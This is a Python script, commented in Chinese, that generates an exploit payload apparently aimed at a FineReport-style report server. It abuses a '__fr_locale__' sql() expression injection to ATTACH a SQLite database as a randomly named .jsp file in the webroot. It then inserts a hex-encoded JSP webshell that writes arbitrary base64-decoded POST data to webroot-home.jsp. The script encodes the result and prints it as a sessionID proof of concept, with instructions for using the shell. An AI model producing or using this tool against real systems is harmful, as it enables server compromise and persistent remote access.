import random
import re
import string
import urllib.parse

def re_encode_url_parts(text):
    """
    只对文本中已经URL编码的部分（%XX格式）再次进行URL编码

    参数:
        text (str): 包含URL编码部分的文本

    返回:
        str: 处理后的文本
    """

    # 使用正则表达式查找所有的%XX格式
    def replace_encoded(match):
        # 对找到的%XX进行URL编码
        return urllib.parse.quote(match.group(0), safe='')

    # %后跟两个十六进制字符的模式
    pattern = r'%[0-9A-Fa-f]{2}'

    # 替换所有匹配项
    return re.sub(pattern, replace_encoded, text)


def generate_random_string(length):
    """生成指定长度的随机小写字母字符串"""
    characters = string.ascii_lowercase  # 只使用小写字母
    return ''.join(random.choice(characters) for _ in range(length))


def custom_encode(text):
    """
    将文本中的非字母字符编码为[XX]格式，其中XX是字符的十六进制Unicode值
    字母字符保持不变
    """
    result = []

    for char in text:
        if not (char.isalpha() or char.isdigit()):  # 只编码非字母和非数字字符
            hex_value = format(ord(char), 'X')  # 转换为大写十六进制
            result.append(f"[{hex_value}]")
        else:
            result.append(char)  # 字母字符保持不变

    return ''.join(result)


def process_text(text):
    """
    处理特定文本：只对URL编码部分再次编码，然后进行自定义编码

    参数:
        text (str): 要处理的文本

    返回:
        str: 处理后的文本
    """
    # 只对URL编码部分再次编码
    re_encoded = re_encode_url_parts(text)

    # 然后进行自定义编码
    custom_encoded = custom_encode(re_encoded)

    return custom_encoded

# 生成随机字符串
random_jsp = generate_random_string(4) + '.jsp'
random_gggggg = generate_random_string(6)
random_exp = generate_random_string(3)
shellhex = "3c2540207061676520696d706f72743d226a6176612e696f2e2a2c6a6176612e7574696c2e4261736536342220253e3c256f75742e7072696e7428224b464322293b537472696e6720613d726571756573742e676574506172616d6574657228226122293b69662861213d6e756c6c297b627974655b5d20623d4261736536342e6765744465636f64657228292e6465636f64652861293b537472696e6720703d726571756573742e676574536572766c6574436f6e7465787428292e6765745265616c5061746828726571756573742e676574536572766c6574506174682829293b537472696e67206469723d6e65772046696c652870292e676574506172656e7428293b46696c654f757470757453747265616d206f3d6e65772046696c654f757470757453747265616d286e65772046696c65286469722c22776562726f6f742d686f6d652e6a73702229293b6f2e77726974652862293b6f2e636c6f736528293b7d253e0a"
# 你的特定文本
original_text = (("${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFATTACH%20DATABASE%20%27..%2Fwebapps%2Fwebroot%2Faaaa.jsp%27%20as%20gggggg%3B'),1,1)}"+
                 "${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFCREATE%20TABLE%20gggggg.exp2%28data%20text%29%3B'),1,1)}")+
                 "${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20gggggg.exp2%28data%29%20VALUES%20%28x%27shellhex%27%29%3B'),1,1)}")
original_text = original_text.replace("aaaa.jsp", random_jsp).replace("gggggg", random_gggggg).replace("shellhex", shellhex).replace("exp2", random_exp)
# 处理文本
result = process_text(original_text)

# 输出结果
print("upload-shell路径:/"+random_jsp+"\n利用方式POST a=urlencode(base64)\n生成马路径/webroot-home.jsp")
# print("\n只对URL编码部分再次编码后:")
# re_encoded = re_encode_url_parts(original_text)
# print(re_encoded)
print("\n最终编码POC:")
print("sessionID:"+result)
